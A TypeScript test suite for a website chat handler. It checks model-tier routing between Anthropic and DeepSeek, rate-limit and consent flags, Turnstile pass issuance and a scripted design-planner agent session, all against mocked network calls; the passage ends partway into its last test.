import assert from "node:assert/strict";
import { registerHooks } from "node:module";
import test from "node:test";

import type Anthropic from "@anthropic-ai/sdk";
import { GOD_CHAT_ANTHROPIC_CONSENT, GOD_CHAT_LIMITS, GOD_CHAT_PASS_TTL_MS, GOD_CHAT_TURNSTILE_ACTION, type GodChatEvent, type GodChatMessage } from "@shared/god-chat";
import { GOD_CHAT_TIERS, GOD_CHAT_TIER_INFO } from "@shared/god-chat-tiers";
import { BUILD_DESIGN_LIMITS, PLAN_LABELS, type BuildPlan } from "@shared/build-routine";
import type { Env } from "./runtime.ts";
import type { ChatQuota } from "./chat/quota.ts";
import type { AnthropicEgress } from "./chat/egress.ts";
import type { BuildCoordinator } from "./build/coordinator.ts";
import type { ChatLog, Transcript } from "./chat/transcripts.ts";
import { signBuildToken } from "./build/token.ts";
import { readPlan } from "./build/plan.ts";
import { sealExchange, sealedHistory } from "./chat/seal.ts";
import { DESIGN_BUDGET_CENTS, PLANNER_PROMPT } from "./chat/design.ts";

// Node 不提供 cloudflare:workers；这里只替换基类，SDK 与流式序列化使用真实实现。
registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier !== "cloudflare:workers") return nextResolve(specifier, context);
    return { url: "data:text/javascript,export class DurableObject{}", shortCircuit: true };
  },
});
const { handleChat } = await import("./chat/handler.ts");
const { issuePass } = await import("./chat/pass.ts");
const PASS = (await issuePass("test-seal")).pass;

const unexpected = () => new Response("unexpected fetch", { status: 500 });

// DeepSeek 两档不经 Anthropic 出口，直接走全局 fetch；测试把发往 DeepSeek 的请求交给 handle，其余照旧。
function deepseekFetch(handle: (request: Request) => Promise<Response>, rest: typeof fetch = async () => unexpected()): typeof fetch {
  return async (input, init) => {
    const request = new Request(input, init);
    return new URL(request.url).hostname === "api.deepseek.com" ? handle(request) : rest(input, init);
  };
}

type TestStub<T> = Partial<{ [K in keyof T]: T[K] extends (...args: infer A) => infer R ? (...args: A) => R | Promise<Awaited<R>> : T[K] }>;

function binding<T extends Rpc.DurableObjectBranded>(stub: TestStub<T>): DurableObjectNamespace<T> {
  const id: DurableObjectId = { toString: () => "test", equals: () => true };
  return {
    newUniqueId: () => id,
    idFromName: () => id,
    idFromString: () => id,
    get: () => stub as DurableObjectStub<T>,
    getByName: () => stub as DurableObjectStub<T>,
    jurisdiction: () => { throw new Error("Unexpected jurisdiction call"); },
  };
}

function modelStream(model: string, tool: boolean | { name: string; input: unknown }): Response {
  const call = typeof tool === "object" ? tool : { name: "get_site_status", input: { views: ["timezone"] } };
  const events = [
    { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
    { type: "content_block_start", index: 0, content_block: tool
      ? { type: "tool_use", id: "tool_test", name: call.name, input: {} }
      : { type: "text", text: "", citations: [] } },
    { type: "content_block_delta", index: 0, delta: tool
      ? { type: "input_json_delta", partial_json: JSON.stringify(call.input) }
      : { type: "text_delta", text: "Done." } },
    { type: "content_block_stop", index: 0 },
    { type: "message_delta", delta: { stop_reason: tool ? "tool_use" : "end_turn", stop_sequence: null }, usage: { output_tokens: 10 } },
    { type: "message_stop" },
  ];
  return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), {
    headers: { "Content-Type": "text/event-stream" },
  });
}

test("各档的 SDK 请求都启用消息级 effort，工具续跑继承强度并在签名 trace 中记录；DeepSeek 两档去掉它不支持的字段", async (t) => {
  const original = globalThis.fetch;
  t.after(() => {
    globalThis.fetch = original;
  });
  for (const tier of GOD_CHAT_TIERS) {
    await t.test(tier, async () => {
      const info = GOD_CHAT_TIER_INFO[tier];
      const deepseek = info.provider === "deepseek";
      const requests: { body: Anthropic.Beta.MessageCreateParamsStreaming; headers: Headers; url: string }[] = [];
      const respond = async (request: Request) => {
        const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
        requests.push({ body, headers: request.headers, url: request.url });
        return modelStream(body.model, requests.length === 1);
      };
      globalThis.fetch = deepseekFetch(respond);
      const transcripts: Transcript[] = [];
      const env: Env = {
        PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
        AI_DEV: "true",
        CHAT_FORCE_TIER: tier,
        ANTHROPIC_API_KEY: "test-key",
        DEEPSEEK_API_KEY: "test-deepseek",
        TURNSTILE_SECRET_KEY: "test-turnstile",
        EXA_API_KEY: "test-exa",
        CHAT_HISTORY_SECRET: "test-seal",
        ALLOWED_ORIGINS: "https://lyjw.me",
        CHAT_QUOTA: binding<ChatQuota>({
          admitVisitor: async () => "ok" as const,
          admitTier: async () => tier,
        }),
        ANTHROPIC_EGRESS: binding<AnthropicEgress>({ colo: async () => "KIX", fetch: respond }),
        CHAT_LOG: binding<ChatLog>({ record: async (entry) => { transcripts.push(entry); } }),
      };
      const response = await handleChat(new Request("https://api.test/api/chat", {
        method: "POST", body: JSON.stringify({ humanPass: PASS, anthropic: "allow", messages: [{ role: "user", content: "What's the timezone?" }] }),
      }), env, {
        readStatus: async () => Response.json({ ok: true, data: { timezone: "Asia/Singapore" } }),
        readDoc: async () => new Response("unused"),
      });
      const events = (await response.text()).trim().split("\n").map((line) => JSON.parse(line) as GodChatEvent);
      assert.equal(requests.length, 2);
      for (const { body, headers, url } of requests) {
        assert.equal(body.model, info.model);
        assert.equal(new URL(url).hostname, deepseek ? "api.deepseek.com" : "api.anthropic.com");
        assert.ok(body.tools?.every((tool) => !("name" in tool) || !["draft_github_issue", "start_design", "propose_build"].includes(tool.name)));
        assert.equal(body.output_config, undefined);
        assert.equal(body.mcp_servers, undefined);
        assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_search" && !("type" in tool)));
        assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_fetch"));
        assert.ok(!headers.get("anthropic-beta")?.includes("mcp-client-2025-11-20"));
        assert.deepEqual(body.thinking, info.thinking ? { type: "adaptive" } : { type: "disabled" });
        assert.deepEqual(body.messages.filter((m) => m.role === "system"), [{ role: "system", content: [], output_config: { effort: info.effort } }]);
        const domain = body.tools?.filter((tool) => "name" in tool && ["anime_search", "game_search"].includes(tool.name)) ?? [];
        assert.equal(domain.length, 2);
        if (deepseek) {
          assert.ok(body.tools?.every((tool) => tool.type !== "tool_search_tool_bm25_20251119"));
          assert.ok(domain.every((tool) => "defer_loading" in tool && tool.defer_loading === false));
          assert.equal(headers.get("anthropic-beta"), null);
          assert.equal("fallbacks" in body, false);
        } else {
          assert.ok(body.tools?.some((tool) => tool.type === "tool_search_tool_bm25_20251119"));
          assert.ok(domain.every((tool) => "defer_loading" in tool && tool.defer_loading));
          assert.ok(headers.get("anthropic-beta")?.includes("mid-conversation-output-config-2026-07-01"));
          assert.equal(headers.get("anthropic-beta")?.includes("server-side-fallback-2026-07-01"), info.serverFallback);
        }
      }
      const replayed = requests[1].body.messages.slice(0, requests[0].body.messages.length);
      assert.deepEqual(replayed, requests[0].body.messages);
      assert.ok(events.some((e) => e.type === "text" && e.text === "Done."));
      const seal = events.find((e) => e.type === "seal");
      assert.ok(seal?.type === "seal");
      assert.equal(seal.trace?.effort, info.effort);
      assert.equal(transcripts.length, 1);
      assert.deepEqual(transcripts[0].messages.map((m) => m.content), ["What's the timezone?"]);
      assert.equal(transcripts[0].outcome, "complete");
      assert.equal(transcripts[0].tier, tier);
      assert.ok(transcripts[0].reply.includes("Done."));
      assert.equal(transcripts[0].trace?.effort, info.effort);
    });
  }
});

test("关闭限流和强制模型只有显式 AI 开发或预览开关才生效", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });

  for (const flags of [{}, { AI_DEV: "false", PREVIEW_WORKER: "false" }, { AI_DEV: "true" }, { PREVIEW_WORKER: "true" }]) {
    const dev = flags.AI_DEV === "true" || flags.PREVIEW_WORKER === "true";
    const enforced: boolean[] = [];
    const tiers: string[] = [];
    const response = await handleChat(new Request("https://ai.test/api/chat", {
      method: "POST", body: JSON.stringify({ humanPass: PASS, anthropic: "allow", messages: [{ role: "user", content: "hello" }] }),
    }), {
      ...flags,
      PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
      ANTHROPIC_API_KEY: "test-key",
      DEEPSEEK_API_KEY: "test-deepseek",
      TURNSTILE_SECRET_KEY: "test-turnstile",
      CHAT_HISTORY_SECRET: "test-seal",
      ALLOWED_ORIGINS: "https://lyjw.me",
      CHAT_RATE_LIMIT: "off",
      CHAT_FORCE_TIER: "fable",
      CHAT_QUOTA: binding<ChatQuota>({
        admitVisitor: async (_ip, enforce) => { enforced.push(enforce ?? true); return "ok" as const; },
        admitTier: async (_ip, tier) => { tiers.push(tier); return null; },
      }),
    }, {
      readStatus: async () => new Response("unused"),
      readDoc: async () => new Response("unused"),
    });
    assert.equal(response.status, 429);
    await response.text();
    assert.deepEqual(enforced, [!dev]);
    assert.deepEqual(tiers, dev ? ["fable"] : ["flash"]);
  }
});

test("选 Claude 阵容时 Clef 判的杂鱼档由 Haiku 出场，额度按 claude 阵容扣", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const seen: { visitor?: string; tier?: [string, string | undefined] } = {};
  const response = await handleChat(new Request("https://ai.test/api/chat", {
    method: "POST", body: JSON.stringify({ humanPass: PASS, anthropic: "allow", lineup: "claude", messages: [{ role: "user", content: "hello" }] }),
  }), {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    ALLOWED_ORIGINS: "https://lyjw.me",
    AI_DEV: "true",
    CHAT_FORCE_TIER: "flash",
    CHAT_QUOTA: binding<ChatQuota>({
      admitVisitor: async (_ip, _enforce, lineup) => { seen.visitor = lineup; return "ok" as const; },
      admitTier: async (_ip, wanted, _enforce, _allow, lineup) => { seen.tier = [wanted, lineup]; return null; },
    }),
  }, { readStatus: async () => new Response("unused"), readDoc: async () => new Response("unused") });
  assert.equal(response.status, 429);
  await response.text();
  assert.equal(seen.visitor, "claude");
  assert.deepEqual(seen.tier, ["haiku", "claude"]);
});

test("开发环境强制 haiku 时额度预检按 claude 阵容算，不被请求里的 DeepSeek 阵容挡住", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const seen: (string | undefined)[] = [];
  const response = await handleChat(new Request("https://ai.test/api/chat", {
    method: "POST", body: JSON.stringify({ humanPass: PASS, anthropic: "allow", lineup: "deepseek", messages: [{ role: "user", content: "hello" }] }),
  }), {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    ALLOWED_ORIGINS: "https://lyjw.me",
    AI_DEV: "true",
    CHAT_FORCE_TIER: "haiku",
    CHAT_QUOTA: binding<ChatQuota>({
      admitVisitor: async (_ip, _enforce, lineup) => { seen.push(lineup); return "ok" as const; },
      admitTier: async (_ip, _wanted, _enforce, _allow, lineup) => { seen.push(lineup); return null; },
    }),
  }, { readStatus: async () => new Response("unused"), readDoc: async () => new Response("unused") });
  await response.text();
  assert.deepEqual(seen, ["claude", "claude"]);
});

test("DeepSeek 阵容里 Clef 选了神：没表态回 409 不扣神档名额，这一条拒绝就改由先知答，同意了照常给神", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const ask = async (anthropic?: string) => {
    const wanted: string[] = [];
    const response = await handleChat(new Request("https://ai.test/api/chat", {
      method: "POST", body: JSON.stringify({ humanPass: PASS, ...(anthropic && { anthropic }), messages: [{ role: "user", content: "What is consciousness?" }] }),
    }), {
      PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
      ANTHROPIC_API_KEY: "test-key",
      DEEPSEEK_API_KEY: "test-deepseek",
      TURNSTILE_SECRET_KEY: "test-turnstile",
      CHAT_HISTORY_SECRET: "test-seal",
      ALLOWED_ORIGINS: "https://lyjw.me",
      AI_DEV: "true",
      CHAT_FORCE_TIER: "fable",
      CHAT_QUOTA: binding<ChatQuota>({ admitVisitor: async () => "ok" as const, admitTier: async (_ip, tier) => { wanted.push(tier); return null; } }),
    }, { readStatus: async () => new Response("unused"), readDoc: async () => new Response("unused") });
    const body = await response.json() as { code?: string };
    return { status: response.status, code: body.code, wanted };
  };
  assert.deepEqual(await ask(), { status: 409, code: GOD_CHAT_ANTHROPIC_CONSENT, wanted: [] });
  assert.deepEqual((await ask("deny")).wanted, ["think"]);
  assert.deepEqual((await ask("allow")).wanted, ["fable"]);
});

test("没有有效通行证就要 Turnstile：验过后下发通行证，通行证用掉一半才换新，过期或伪造回 403", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  const verified: string[] = [];
  globalThis.fetch = deepseekFetch(
    async (request) => modelStream((await request.json() as { model: string }).model, false),
    async (_input, init) => {
      const token = new URLSearchParams(String(init?.body)).get("response") ?? "";
      verified.push(token);
      return Response.json({ success: token === "good", hostname: "lyjw.me", action: GOD_CHAT_TURNSTILE_ACTION });
    },
  );
  const env: Env = {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    ALLOWED_ORIGINS: "https://lyjw.me",
    AI_DEV: "true",
    CHAT_FORCE_TIER: "flash",
    CHAT_QUOTA: binding<ChatQuota>({ admitVisitor: async () => "ok" as const, admitTier: async () => "flash" as const }),
  };
  const io = { readStatus: async () => new Response("unused"), readDoc: async () => new Response("unused") };
  const ask = async (proof: Record<string, string>) => {
    const response = await handleChat(new Request("https://ai.test/api/chat", {
      method: "POST", body: JSON.stringify({ ...proof, messages: [{ role: "user", content: "hello" }] }),
    }), env, io);
    const text = await response.text();
    return { status: response.status, events: response.ok ? text.trim().split("\n").map((line) => JSON.parse(line) as GodChatEvent) : [], body: response.ok ? undefined : JSON.parse(text) as { code?: string } };
  };
  const passOf = (events: GodChatEvent[]) => events.find((event) => event.type === "pass");

  const fresh = await ask({ turnstileToken: "good" });
  assert.equal(fresh.status, 200);
  const issued = passOf(fresh.events);
  assert.ok(issued?.type === "pass");
  assert.equal(fresh.events[0].type, "pass");

  assert.equal((await ask({ turnstileToken: "bad" })).status, 403);
  verified.length = 0;
  const reused = await ask({ humanPass: issued.pass });
  assert.equal(reused.status, 200);
  assert.equal(passOf(reused.events), undefined);
  assert.deepEqual(verified, []);

  const halfUsed = (await issuePass("test-seal", Date.now() - GOD_CHAT_PASS_TTL_MS / 2 - 1000)).pass;
  assert.ok(passOf((await ask({ humanPass: halfUsed })).events));

  const expired = (await issuePass("test-seal", Date.now() - GOD_CHAT_PASS_TTL_MS - 1000)).pass;
  const stale = await ask({ humanPass: expired });
  assert.equal(stale.status, 403);
  assert.equal(stale.body?.code, "human_pass_expired");
  assert.equal((await ask({ humanPass: (await issuePass("other-secret")).pass })).status, 403);
});

const plan: BuildPlan = {
  title: "Improve the music card empty state",
  spec: "Show an English empty-state label when no music is playing, including at mobile widths.",
  acceptance: ["At 375px the card fits its container."],
  paths: ["src/components/live/music-card.tsx"],
};

type Scripted = Record<string, unknown>;
const at = new Date(0).toISOString();
const agent = {
  running: { type: "session.status_running", id: "sevt_run", processed_at: at },
  say: (id: string, text: string): Scripted[] => [
    { type: "event_start", event: { type: "agent.message", id } },
    { type: "event_delta", event_id: id, delta: { type: "content_delta", index: 0, content: { type: "text", text: text.slice(0, 3) } } },
    { type: "agent.message", id, content: [{ type: "text", text }], processed_at: at },
  ],
  tool: (id: string, name: string, input: Record<string, unknown>, permission = "allow"): Scripted => ({ type: "agent.tool_use", id, name, input, evaluated_permission: permission, processed_at: at }),
  custom: (id: string, name: string, input: unknown): Scripted => ({ type: "agent.custom_tool_use", id, name, input, processed_at: at }),
  idle: (stop_reason: Scripted): Scripted => ({ type: "session.status_idle", id: "sevt_idle", processed_at: at, stop_reason, stop_details: null }),
  waiting: (...event_ids: string[]): Scripted => agent.idle({ type: "requires_action", event_ids }),
  visitor: (id: string, text: string): Scripted => ({ type: "user.message", id, content: [{ type: "text", text }], processed_at: at }),
  result: (id: string, toolId: string, text: string): Scripted => ({ type: "user.custom_tool_result", id, custom_tool_use_id: toolId, content: [{ type: "text", text }], is_error: false, processed_at: at }),
};

const sse = (events: Scripted[]) => new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), { headers: { "Content-Type": "text/event-stream" } });

// 假的出站：DeepSeek 的 /v1/messages 给判断改站请求的 think 档，Anthropic 出口的 /v1/sessions* 扮演 Managed Agents；
// 每开一次事件流按顺序吐下一段脚本。调用方先存好原来的 globalThis.fetch 并在测试结束时还原。
type DesignSetup = { reply?: (body: Anthropic.Beta.MessageCreateParamsStreaming, index: number) => Response; turns?: Scripted[][]; pending?: string[]; history?: Scripted[]; createFails?: boolean };
function designEnv({ reply = (body) => modelStream(body.model, false), turns = [], pending = [], history = [], createFails = false }: DesignSetup = {}) {
  const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
  const created: Record<string, unknown>[] = [];
  const sent: Scripted[] = [];
  const counters = { visitor: 0, tier: 0, clef: 0, created: 0, admitted: 0, streams: 0, peeked: 0 };
  const sessions = new Map<string, number>();
  const opened = new Set<string>();
  globalThis.fetch = deepseekFetch(async (request) => {
    const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
    requests.push(body);
    return reply(body, requests.length - 1);
  }, globalThis.fetch);
  const env: Env = {
    PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
    ANTHROPIC_API_KEY: "test-key",
    DEEPSEEK_API_KEY: "test-deepseek",
    TURNSTILE_SECRET_KEY: "test-turnstile",
    CHAT_HISTORY_SECRET: "test-seal",
    BUILD_SESSION_SECRET: "test-build",
    DESIGN_AGENT_ID: "agent_test",
    DESIGN_ENVIRONMENT_ID: "env_test",
    ALLOWED_ORIGINS: "https://lyjw.me",
    CHAT_QUOTA: binding<ChatQuota>({
      admitVisitor: async () => { counters.visitor++; return "ok" as const; },
      admitTier: async (_ip, wanted, _enforce, allowDowngrade) => {
        counters.tier++;
        assert.equal(wanted, "think");
        assert.equal(allowDowngrade, false);
        return "think" as const;
      },
    }),
    AI: Object.assign({} as Ai, { run: async () => { counters.clef++; return { answers: { route: { choice: "design" } } }; } }),
    BUILD_COORDINATOR: binding<BuildCoordinator>({
      createDesign: async (id) => { counters.created++; sessions.set(id, 0); return true; },
      admitDesign: async (id) => {
        counters.admitted++;
        const count = sessions.get(id);
        if (count === undefined) return { status: "expired", remaining: 0 };
        if (count >= BUILD_DESIGN_LIMITS.maxTurns) return { status: "exhausted", remaining: 0 };
        sessions.set(id, count + 1);
        return { status: "ok", remaining: BUILD_DESIGN_LIMITS.maxTurns - count - 1 };
      },
      peekDesign: async (id) => {
        counters.peeked++;
        const count = sessions.get(id);
        return count === undefined ? { status: "expired", remaining: 0 } : { status: "ok", remaining: BUILD_DESIGN_LIMITS.maxTurns - count };
      },
      claimDesignOpen: async (sessionId) => !opened.has(sessionId) && Boolean(opened.add(sessionId)),
    }),
    ANTHROPIC_EGRESS: binding<AnthropicEgress>({
      colo: async () => "KIX",
      fetch: async (request: Request) => {
        const { pathname } = new URL(request.url);
        if (pathname === "/v1/sessions" && request.method === "POST") {
          if (createFails) return Response.json({ type: "error", error: { type: "api_error", message: "down" } }, { status: 500 });
          created.push(await request.json() as Record<string, unknown>);
          return Response.json({ id: "sesn_test", type: "session", status: "idle" });
        }
        if (pathname === "/v1/sessions/sesn_test/events/stream") {
          counters.streams++;
          return sse(turns.shift() ?? []);
        }
        if (pathname === "/v1/sessions/sesn_test/events" && request.method === "POST") {
          const body = await request.json() as { events: Scripted[] };
          sent.push(...body.events);
          return Response.json({ data: body.events });
        }
        if (pathname === "/v1/sessions/sesn_test/events") {
          if (![...new URL(request.url).searchParams.keys()].some((key) => key.startsWith("types"))) return Response.json({ data: [...history, ...sent].reverse(), next_page: null });
          return Response.json({ data: pending.length ? [agent.waiting(...pending)] : [], next_page: null });
        }
        if (pathname === "/v1/sessions/sesn_test") return Response.json({ id: "sesn_test", type: "session", status: "idle" });
        throw new Error(`Unexpected request ${request.method} ${pathname}`);
      },
    }),
  };
  return { env, requests, created, sent, counters, sessions };
}

function chatRequest(designToken?: string, messages: GodChatMessage[] = [{ role: "user", content: "Please improve the music card." }], resume = false) {
  return new Request("https://api.test/api/chat", { method: "POST", body: JSON.stringify({ humanPass: PASS, anthropic: "allow", messages, ...(designToken && { designToken }), ...(resume && { resume }) }) });
}
const toolIO = { readStatus: async () => Response.json({ ok: true, data: { timezone: "Asia/Singapore" } }), readDoc: async () => new Response("unused") };
const parseEvents = async (response: Response) => (await response.text()).trim().split("\n").map((line) => JSON.parse(line) as GodChatEvent);
const textOf = (events: GodChatEvent[]) => events.flatMap((event) => event.type === "text" ? [event.text] : []).join("");
const designToken = async (env: Env, sessions: Map<string, number>, payload: Record<string, unknown> = {}) => {
  const id = crypto.randomUUID();
  sessions.set(id, 1);
  return signBuildToken({ kind: "design", id, expiresAt: Date.now() + BUILD_DESIGN_LIMITS.ttlMs, sessionId: "sesn_test", ...payload }, env.BUILD_SESSION_SECRET!);
};

test("改站请求由 think 判断，start_design 只建会话发令牌、不上传访客内容；同意后补发带出开场回合，计划挂起等访客，进历史签章", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, requests, created, sent, counters } = designEnv({
    reply: (body, index) => modelStream(body.model, index === 0 ? { name: "start_design", input: {} } : false),
    turns: [[
      agent.running,
      agent.tool("tu_clone", "bash", { command: "git clone --depth 1 https://github.com/LYJW131/lyjwpage.git /workspace/lyjwpage" }),
      agent.tool("tu_read", "read", { file_path: "/workspace/lyjwpage/src/components/live/music-card.tsx" }),
      agent.tool("tu_grep", "grep", { pattern: "empty state" }),
      ...agent.say("sevt_m1", "Here is my plan."),
      agent.custom("ctu_plan", "propose_build", plan),
      agent.waiting("ctu_plan"),
    ]],
  });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.deepEqual(requests.map((body) => body.model), [GOD_CHAT_TIER_INFO.think.model]);
  assert.equal(created.length, 1);
  const session = created[0] as { agent: { type: string; id: string; system: string; model: { id: string }; tools: { type: string; name?: string; configs?: { name: string; enabled?: boolean }[] }[] }; environment_id: string; budget: { max_list_cost: { amount: string } } };
  assert.equal(session.agent.type, "agent_with_overrides");
  assert.equal(session.agent.id, "agent_test");
  assert.equal(session.agent.system, PLANNER_PROMPT);
  assert.equal(session.agent.model.id, GOD_CHAT_TIER_INFO.opus.model);
  assert.deepEqual(session.agent.tools.map((tool) => tool.name ?? tool.type), ["agent_toolset_20260401", "ask_visitor", "propose_build", "get_site_status"]);
  assert.deepEqual(session.agent.tools[0].configs?.filter((config) => config.enabled === false).map((config) => config.name), ["write", "edit"]);
  assert.equal(session.environment_id, "env_test");
  assert.equal(session.budget.max_list_cost.amount, String(DESIGN_BUDGET_CENTS));
  // 同意前：建了会话但一条访客内容都没发给 Managed Agents。
  assert.equal(sent.length, 0);
  assert.deepEqual(events.filter((event) => event.type === "route").map((event) => event.type === "route" && event.tier), ["think"]);
  const design = events.find((event) => event.type === "design");
  assert.ok(design?.type === "design");
  assert.equal(design.remaining, BUILD_DESIGN_LIMITS.maxTurns - 1);
  assert.equal(textOf(events), PLAN_LABELS.en.handoff);
  assert.ok(events.findIndex((event) => event.type === "text") < events.findIndex((event) => event.type === "design"), "the ordinary chat says one line before the planner takes over");
  assert.ok(!events.some((event) => event.type === "plan" || event.type === "doc" || event.type === "step" || event.type === "ask"));
  const firstSeal = events.find((event) => event.type === "seal");
  assert.ok(firstSeal?.type === "seal" && !firstSeal.planToken && firstSeal.trace?.tier === "think" && !firstSeal.trace?.design);
  assert.deepEqual(counters, { visitor: 1, tier: 1, clef: 1, created: 1, admitted: 1, streams: 0, peeked: 0 });

  // 同意后的补发：空会话补开场回合，整段历史此刻才进 Managed Agents。
  const opened = await parseEvents(await handleChat(chatRequest(design.token, [{ role: "user", content: "Please improve the music card." }], true), env, toolIO));
  assert.equal(sent.length, 1);
  assert.equal(sent[0].type, "user.message");
  assert.match(JSON.stringify(sent[0]), /Please improve the music card\./);
  assert.deepEqual(opened.filter((event) => event.type === "route").map((event) => event.type === "route" && event.tier), ["opus"]);
  assert.ok(opened.some((event) => event.type === "design" && event.remaining === BUILD_DESIGN_LIMITS.maxTurns - 1));
  assert.deepEqual(opened.filter((event) => event.type === "step").map((event) => event.type === "step" && event.text), ["Cloned the repository", "Searched the code for “empty state”"]);
  assert.ok(opened.some((event) => event.type === "doc" && event.doc === "repo" && event.path === "src/components/live/music-card.tsx" && event.url.endsWith("/blob/main/src/components/live/music-card.tsx")));
  assert.equal(textOf(opened), "Here is my plan.");
  const proposed = opened.find((event) => event.type === "plan");
  assert.ok(proposed?.type === "plan");
  assert.deepEqual((await readPlan(env, proposed.token))?.plan, plan);
  const seal = opened.find((event) => event.type === "seal");
  assert.ok(seal?.type === "seal");
  assert.equal(seal.planToken, proposed.token);
  assert.deepEqual({ tier: seal.trace?.tier, design: seal.trace?.design, plan: seal.trace?.plan }, { tier: "opus", design: true, plan: true });
  assert.deepEqual(counters, { visitor: 1, tier: 1, clef: 1, created: 1, admitted: 1, streams: 1, peeked: 1 });
  const history: GodChatMessage[] = [
    { role: "user", content: "Please improve the music card." },
    { role: "assistant", content: textOf(events), seal: firstSeal.seal, trace: firstSeal.trace },
    { role: "assistant", content: textOf(opened), seal: seal.seal, trace: seal.trace, planToken: seal.planToken },
    { role: "user", content: "Make the empty label shorter." },
  ];
  assert.equal((await sealedHistory(history, env.CHAT_HISTORY_SECRET!)).length, 4);
  assert.equal((await sealedHistory([history[0], history[1], { ...history[2], planToken: `${proposed.token}x` }, history[3]], env.CHAT_HISTORY_SECRET!)).length, 3);

  const next = designEnv({ pending: ["ctu_plan"], turns: [[agent.running, ...agent.say("sevt_m2", "Shortened."), agent.idle({ type: "end_turn" })]] });
  const token = await designToken(next.env, next.sessions);
  const answered = await parseEvents(await handleChat(chatRequest(token, history), next.env, toolIO));
  assert.deepEqual(next.sent, [{ type: "user.custom_tool_result", custom_tool_use_id: "ctu_plan", content: [{ type: "text", text: "The visitor replied:\nMake the empty label shorter." }], is_error: false }]);
  assert.equal(textOf(answered), "Shortened.");
  assert.deepEqual(next.requests, []);
  assert.deepEqual(next.counters, { visitor: 0, tier: 0, clef: 0, created: 0, admitted: 1, streams: 1, peeked: 0 });
  const sealed = answered.find((event) => event.type === "seal");
  assert.ok(sealed?.type === "seal" && sealed.trace?.design && !sealed.planToken);
});

test("同意后两个标签页同时补发：开场只发一次，抢不到开场的那页等开场落进会话后跟着看同一回合", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const turn = [agent.running, ...agent.say("sevt_m1", "Here is my plan."), agent.custom("ctu_plan", "propose_build", plan), agent.waiting("ctu_plan")];
  const { env, sent, sessions } = designEnv({ turns: [turn, turn] });
  const token = await designToken(env, sessions);
  const messages: GodChatMessage[] = [{ role: "user", content: "Please improve the music card." }];
  const replies = await Promise.all([1, 2].map(async () => parseEvents(await handleChat(chatRequest(token, messages, true), env, toolIO))));
  assert.equal(sent.filter((event) => event.type === "user.message").length, 1);
  for (const events of replies) {
    assert.equal(textOf(events), "Here is my plan.");
    assert.ok(events.some((event) => event.type === "plan"));
    assert.ok(events.some((event) => event.type === "seal"));
  }
});

test("会话没有挂起的工具调用时，访客的话按普通消息发给规划者", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, sent, sessions } = designEnv({ turns: [[agent.running, ...agent.say("sevt_m", "Sure."), agent.idle({ type: "end_turn" })]] });
  await parseEvents(await handleChat(chatRequest(await designToken(env, sessions)), env, toolIO));
  assert.deepEqual(sent, [{ type: "user.message", content: [{ type: "text", text: "Please improve the music card." }] }]);
});

test("规划者没写字就出计划时，开场白跟访客看得到的中文标题走，不跟英文规格；写了字就不再补", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const zhPlan = { ...plan, title: "回答完问题后自动折叠问题框" };
  const silent = designEnv({ turns: [[agent.running, agent.custom("ctu_plan", "propose_build", zhPlan), agent.waiting("ctu_plan")]] });
  const quiet = await parseEvents(await handleChat(chatRequest(await designToken(silent.env, silent.sessions)), silent.env, toolIO));
  assert.equal(textOf(quiet), PLAN_LABELS.zh.planReady);
  const spoken = designEnv({ turns: [[agent.running, ...agent.say("sevt_m", "改完后回答过的问题会收起来。"), agent.custom("ctu_plan", "propose_build", zhPlan), agent.waiting("ctu_plan")]] });
  const said = await parseEvents(await handleChat(chatRequest(await designToken(spoken.env, spoken.sessions)), spoken.env, toolIO));
  assert.equal(textOf(said), "改完后回答过的问题会收起来。");
});

test("规划者的自定义工具：站点状态当场回结果，不合规的题目与禁区计划报错让它重试，合规的题目挂起等访客；要确认的内置工具一律拒绝", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
